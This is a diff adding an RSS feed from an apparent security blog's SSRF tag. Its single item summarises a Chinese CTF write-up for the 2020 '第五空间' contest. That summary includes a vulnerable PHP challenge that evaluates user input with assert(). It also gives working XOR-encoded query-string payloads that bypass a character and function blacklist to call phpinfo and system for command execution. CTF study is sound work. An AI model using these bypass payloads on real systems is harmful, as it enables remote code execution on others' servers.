@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SSRF on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/ssrf/</link>
+    <description>Recent content in SSRF on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 26 Jun 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>“第五空间”智能安全大赛</title>
+      <link>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</link>
+      <pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</guid>
+      <description>hate-php 考点：异或取反构造无字母数字webshell
+开题送码：
+&amp;lt;?phperror_reporting(0);if(!isset($_GET[&#39;code&#39;])){highlight_file(__FILE__);}else{$code = $_GET[&#39;code&#39;];if (preg_match(&#39;/(f|l|a|g|\.|p|h|\/|;|\&amp;quot;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;,$code)) { die(&#39;You are too good for me&#39;); }$blacklist = get_defined_functions()[&#39;internal&#39;];foreach ($blacklist as $blackitem) { if (preg_match (&#39;/&#39; . $blackitem . &#39;/im&#39;, $code)) { die(&#39;You deserve better&#39;); } }assert($code);}preg_match ban掉了下划线等字符，然后 get_defined_functions()[&#39;internal&#39;] 禁用了内置函数
+但是没有过滤取反~和异或^，
+PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过 (&#39;phpinfo&#39;)(); 来执行函数，第一个括号中可以是任意PHP表达式。
+不但如此，这个payload还支持接受参数，比如 (&#39;phpinfo&#39;)(1) ，这道题过滤了分号，但是这道题不需要分号也可以执行
+那么我们自然可以用这个来执行一些代码；
+?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo成功返回了 phpinfo ，我们继续构造一个shell：
+?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})&amp;amp;%ee=system&amp;amp;%ff=ls可以看到ls的结果，不过cat好像又被宰掉了，用 tac fl* 来获取flag
+do you know 预期：gopher协议SSRF打XXE，URL编码显示空字符，pop链</description>
+    </item>
+    
+  </channel>
+</rss>
